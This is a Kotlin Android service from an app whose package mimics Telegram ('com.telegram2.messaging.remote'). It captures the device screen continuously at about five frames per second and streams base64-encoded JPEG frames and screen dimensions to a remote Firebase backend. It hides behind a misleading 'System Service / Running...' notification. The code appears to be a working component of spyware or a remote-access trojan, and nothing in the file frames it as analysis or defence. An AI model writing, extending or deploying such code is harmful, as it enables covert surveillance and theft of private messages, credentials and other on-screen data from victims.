package com.telegram2.messaging.remote

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Base64
import java.io.ByteArrayOutputStream

class ScreenCaptureService : Service() {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private lateinit var bgThread: HandlerThread
    private lateinit var bgHandler: Handler
    private var isRunning = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "stop") {
            stopCapture()
            return START_NOT_STICKY
        }

        createChannel()
        startForeground(1337, Notification.Builder(this, "screen")
            .setContentTitle("System Service")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .build())

        bgThread = HandlerThread("ScreenCapture").also { it.start() }
        bgHandler = Handler(bgThread.looper)

        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val data = intent?.getParcelableExtra<Intent>("projection") ?: return START_NOT_STICKY
        val code = intent.getIntExtra("resultcode", -1)
        mediaProjection = mpm.getMediaProjection(code, data)

        startCapture()
        isRunning = true
        return START_STICKY
    }

    private fun startCapture() {
        val metrics = resources.displayMetrics
        val w = metrics.widthPixels
        val h = metrics.heightPixels
        val dpi = metrics.densityDpi

        FirebaseBridge.updateScreenInfo(w, h)  // Push dimensions

        imageReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "sc", w, h, dpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface, null, bgHandler
        )
        captureLoop()
    }

    private fun captureLoop() {
        if (!isRunning) return
        imageReader?.acquireLatestImage()?.use { image ->
            val planes = image.planes[0]
            val buffer = planes.buffer
            val pixelStride = planes.pixelStride
            val rowStride = planes.rowStride
            val rowPadding = rowStride - pixelStride * image.width

            val bmp = Bitmap.createBitmap(
                image.width + rowPadding / pixelStride,
                image.height, Bitmap.Config.ARGB_8888
            )
            bmp.copyPixelsFromBuffer(buffer)
            val cropped = Bitmap.createBitmap(bmp, 0, 0, image.width, image.height)

            val baos = ByteArrayOutputStream()
            cropped.compress(Bitmap.CompressFormat.JPEG, 40, baos)
            val base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
            FirebaseBridge.updateScreenFrame(base64)
        }
        bgHandler.postDelayed({ captureLoop() }, 200) // 5 FPS
    }

    private fun stopCapture() {
        isRunning = false
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        bgThread.quitSafely()
        stopForeground(true)
        stopSelf()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel("screen", "Capture", NotificationManager.IMPORTANCE_LOW).also {
                (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(it)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        stopCapture()
    }
}